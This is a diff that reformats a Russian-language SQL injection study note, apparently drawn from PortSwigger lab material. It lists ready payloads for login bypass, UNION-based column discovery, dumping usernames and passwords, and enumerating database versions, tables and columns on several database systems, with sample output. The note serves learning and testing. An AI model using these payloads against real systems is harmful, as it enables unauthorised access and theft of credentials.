@@ -10,145 +10,124 @@ SQL-инъекция — это уязвимость веб-безопаснос
 ## Основная причина
 Неправильная фильтрация пользовательского ввода перед подстановкой в SQL-запрос.
 
-### 1. Извлечение скрытых данных (WHERE)
-' OR 1=1--
-' AND 1=1-- (для слепой)
+---
 
-### 2. Обход аутентификации (Login Bypass)
+## 1. Извлечение скрытых данных (WHERE)
+```sql
+' OR 1=1--
+' AND 1=1--  (для слепой)
+2. Обход аутентификации (Login Bypass)
+sql
 admin' --
 ' OR 1=1; --
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
-Измените usernameпараметр, присвоив ему значение:administrator'--
+Измените параметр username, присвоив ему значение:
+administrator'--
 
-### 3. UNION-атака (определение колонок)
+3. UNION-атака
+3.1 Определение количества колонок
+sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
-
-### 3.1 UNION-атака (определение колонок в Oracle)
+3.2 Определение колонок в Oracle
 В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
-' UNION SELECT NULL FROM DUAL--
 
-### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
+sql
+' UNION SELECT NULL FROM DUAL--
+3.3 Поиск столбцов с полезным типом данных
+sql
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
 Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.
 
-### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
+3.4 Использование UNION для извлечения важных данных
+sql
 ' UNION SELECT username, password FROM users--
-Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
+Для осуществления этой атаки необходимо знать, что существует таблица с именем users и двумя столбцами с именами username и password.
 Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
 Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.
 
-### 3.4 UNION-атака (Извлечение нескольких значений из одного столбца.)
+3.5 Извлечение нескольких значений из одного столбца
+sql
 ' UNION SELECT username || '~' || password FROM users--
 Результаты запроса содержат все имена пользователей и пароли, например:
+
+text
 administrator~s3cure
 wiener~peter
 carlos~montoya
 В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.
-https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-## 🔍 Анализ базы данных при SQL-инъекциях
-
+🔍 Анализ базы данных при SQL-инъекциях
 Для успешной эксплуатации SQL-инъекций часто необходимо получить информацию о базе данных:
-- Тип и версия СУБД
-- Имена таблиц
-- Имена столбцов
 
----
+Тип и версия СУБД
 
-### 1. Определение типа и версии базы данных
+Имена таблиц
 
+Имена столбцов
+
+1. Определение типа и версии базы данных
 Можно внедрить запросы, специфичные для конкретной СУБД, и посмотреть, какой из них сработает.
 
-| СУБД | Запрос для получения версии |
-|------|----------------------------|
-| **Microsoft SQL Server** | `SELECT @@version` |
-| **MySQL** | `SELECT @@version` |
-| **Oracle** | `SELECT * FROM v$version` |
-| **PostgreSQL** | `SELECT version()` |
-
-#### Пример через UNION-атаку:
-```sql
+СУБД	Запрос для получения версии
+Microsoft SQL Server	SELECT @@version
+MySQL	SELECT @@version
+Oracle	SELECT * FROM v$version
+PostgreSQL	SELECT version()
+Пример через UNION-атаку:
+sql
 ' UNION SELECT @@version--
-
-### Пример вывода (Microsoft SQL Server):
+Пример вывода (Microsoft SQL Server):
+text
 Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
 Mar 18 2018 09:11:49
 Copyright (c) Microsoft Corporation
 Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
-
-### Получение списка таблиц (кроме Oracle)
+2. Получение списка таблиц (кроме Oracle)
 Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.
-Запрос для получения списка таблиц:
-SELECT * FROM information_schema.tables
 
-#### Пример результата:
+Запрос для получения списка таблиц:
+
+sql
+SELECT * FROM information_schema.tables
+Пример результата:
 TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	TABLE_TYPE
 MyDatabase	dbo	Products	BASE TABLE
 MyDatabase	dbo	Users	BASE TABLE
 MyDatabase	dbo	Feedback	BASE TABLE
-
-#### Готовый payload для UNION-атаки:
+Готовый payload для UNION-атаки:
+sql
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
+3. Получение списка столбцов (кроме Oracle)
+Используйте представление information_schema.columns.
 
-### Получение списка столбцов (кроме Oracle)
-Используй представление information_schema.columns
+Запрос для получения столбцов конкретной таблицы:
 
-### Запрос для получения столбцов конкретной таблицы:
+sql
 SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-#### Пример результата:
+Пример результата:
 TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	COLUMN_NAME	DATA_TYPE
 MyDatabase	dbo	Users	UserId	int
 MyDatabase	dbo	Users	Username	varchar
 MyDatabase	dbo	Users	Password	varchar
-#### Готовый payload для UNION-атаки:
+Готовый payload для UNION-атаки:
+sql
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--
+4. Анализ базы данных в Oracle
+В Oracle нет information_schema. Используйте другие представления:
 
-### Анализ базы данных в Oracle
-В Oracle нет information_schema. Используй другие представления:
-
-Что узнать	     Запрос
-Список таблиц	   SELECT * FROM all_tables
-Столбцы таблицы	 SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
-#### Готовые payload'ы для Oracle:
+Что узнать	Запрос
+Список таблиц	SELECT * FROM all_tables
+Столбцы таблицы	SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+Готовые payload'ы для Oracle:
+sql
 ' UNION SELECT table_name, NULL FROM all_tables--
 ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
-### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
